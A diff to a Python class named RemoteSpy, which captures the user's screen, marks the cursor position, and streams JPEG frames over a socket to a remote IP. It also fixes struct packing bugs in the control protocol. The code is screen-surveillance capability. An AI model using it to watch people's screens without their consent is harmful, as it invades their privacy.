@@ -1,5 +1,5 @@
 from PyQt5.QtCore import QObject, QBuffer, QIODevice, Qt
-from PyQt5.QtGui import QImage
+from PyQt5.QtGui import QImage, QPainter, QCursor
 import socket
 import struct
 from threading import Thread
@@ -29,11 +29,18 @@ class RemoteSpy(QObject):
         self.socket_ip = socket_ip
 
     def screen_send(self):
+        cursor = QCursor()
         while self.working:
             try:
                 with mss() as sct:
                     frame = sct.grab(sct.monitors[1])
+                    cursor_pos = cursor.pos()
                     img = QImage(frame.rgb, frame.width, frame.height, QImage.Format_RGB888)
+                    painter = QPainter()
+                    painter.begin(img)
+                    painter.setBrush(Qt.red)
+                    painter.drawEllipse(cursor_pos, 5, 5)
+                    painter.end()
                     buffer = QBuffer()
                     buffer.open(QIODevice.ReadWrite)
                     img.save(buffer, 'JPEG', quality=80)
@@ -66,9 +73,9 @@ class RemoteSpy(QObject):
                 if not socket_data:
                     self.stop()
                     break
-                flag = struct.unpack('!i', socket_data)
+                flag = struct.unpack('!i', socket_data)[0]
                 if flag == RemoteSpyFlag.RemoteSpyStop:
-                    self.socket_obj.send(struct.pack('2!', RemoteSpyFlag.RemoteSpyStop, b''))
+                    self.socket_obj.send(struct.pack('!2i', RemoteSpyFlag.RemoteSpyStop, 0))
                     self.stop()
                     break
             except ConnectionResetError:
